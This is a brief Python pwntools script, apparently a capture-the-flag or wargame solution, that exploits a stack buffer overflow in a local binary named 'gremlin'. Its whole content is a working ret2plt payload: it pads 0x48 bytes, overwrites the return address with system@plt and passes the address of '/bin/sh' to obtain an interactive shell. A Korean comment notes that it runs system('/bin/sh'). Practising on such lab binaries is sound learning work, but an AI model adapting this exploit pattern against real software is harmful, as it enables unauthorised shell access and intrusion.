from pwn import *

p = process("./gremlin")

system_plt = 0x80490f0
binsh = 0x804c034

# system("/bin/sh") 실행
p.recvuntil(b"You can use write, read, system and /bin/sh\n")
payload = b'A'*0x44
payload += b'B'*0x4
payload += p32(system_plt)
payload += b'C'*0x4
payload += p32(binsh)
pause()
p.send(payload)

p.interactive()